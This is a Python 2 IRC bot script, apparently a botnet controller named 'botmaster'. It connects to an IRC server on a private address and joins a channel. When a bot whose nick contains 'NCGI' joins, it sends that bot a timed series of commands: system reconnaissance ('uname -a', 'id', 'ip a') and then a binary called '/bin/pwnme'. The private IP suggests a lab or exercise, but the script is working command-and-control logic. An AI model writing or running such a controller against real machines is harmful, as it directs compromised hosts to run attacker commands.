#!/usr/bin/python

import socket
from time import sleep

class IRCClient:
    socket = None
    connected = False
    nickname = 'botmaster'
    channels = ['#bash']

    def __init__(self):
        self.socket = socket.socket()
        self.socket.connect(('192.168.51.5', 6667))
        self.send("NICK %s" % self.nickname)
        self.send("USER %(nick)s %(nick)s %(nick)s :%(nick)s" % {'nick':self.nickname})

        while True:
            buf = self.socket.recv(4096)
            lines = buf.split("\n")
            for data in lines:
                data = str(data).strip()

                if data == '':
                    continue
                print "I<", data

                # server ping/pong?
                if data.find('PING') != -1:
                    n = data.split(':')[1]
                    self.send('PONG :' + n)
                    if self.connected == False:
                        self.perform()
                        self.connected = True

                args = data.split(None, 3)

                if len(args) == 3:
                    if args[1] == 'JOIN' and args[0].find('NCGI') != -1:
                        self.manipulate(args[0].split('!')[0][1:], args[2][1:])

                if len(args) != 4:
                    continue
                ctx = {}
                ctx['sender'] = args[0][1:]
                ctx['type']   = args[1]
                ctx['target'] = args[2]
                ctx['msg']    = args[3][1:]

                # whom to reply?
                target = ctx['target']
                if ctx['target'] == self.nickname:
                    target = ctx['sender'].split("!")[0]

                # some basic commands
                if ctx['msg'] == '!help':
                    self.say('available commands: !help', target)

                # directed to the bot?
                if ctx['type'] == 'PRIVMSG' and (ctx['msg'].lower()[0:len(self.nickname)] == self.nickname.lower() or ctx['target'] == self.nickname):
                    # something is speaking to the bot
                    query = ctx['msg']
                    if ctx['target'] != self.nickname:
                        query = query[len(self.nickname):]
                        query = query.lstrip(':,;. ')
                    # do something intelligent here, like query a chatterbot
                    print 'someone spoke to us: ', query
                    self.say('alright :|', target)

    def send(self, msg):
        print "I>",msg
        self.socket.send(msg+"\r\n")

    def say(self, msg, to):
        self.send("PRIVMSG %s :%s" % (to, msg))

    def perform(self):
        #self.send("PRIVMSG R : Register <>")
        self.send("PRIVMSG R : Login <>")
        self.send("MODE %s +x" % self.nickname)
        for c in self.channels:
            self.send("JOIN %s" % c)
            # say hello to every channel
            self.say('hello world!', c)

    def manipulate(self, puppet, chan):
        sleep(3)
        self.say(puppet + ' @help', chan)
        sleep(10)
        self.say(puppet + ' @system', chan)
        sleep(15)
        self.say(puppet + ' uname -a', chan)
        sleep(10)
        self.say(puppet + ' id', chan)
        sleep(10)
        self.say(puppet + ' /usr/sbin/ip a', chan)
        sleep(30)
        self.say(puppet + ' /bin/pwnme', chan)


IRCClient()
